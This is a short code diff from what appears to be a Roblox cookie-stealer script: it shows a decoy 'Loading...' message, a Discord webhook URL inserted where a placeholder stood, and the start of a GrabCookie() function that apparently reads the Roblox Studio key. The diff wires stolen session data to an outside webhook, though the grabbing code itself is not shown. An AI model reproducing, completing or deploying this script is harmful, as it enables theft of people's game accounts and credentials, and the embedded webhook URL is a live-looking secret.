@@ -11,7 +11,7 @@ import json
 dummy_Message = "Loading..." #change this to whatever you want
 print(dummy_Message)
 
-webhook = "<webhook>" # put webhook here
+webhook = "<https://discord.com/api/webhooks/1112467905880281240/V-oFuBC7wWi9cGO8Py1wOmUIVJhm5qsqoqlVDc-y9jsh0rrBPwTUn6dlYHk5Tj7V_xea>" # put webhook here
 ################### Gathering INFOMATION #################################
 def GrabCookie():
     # opening the roblox studio key
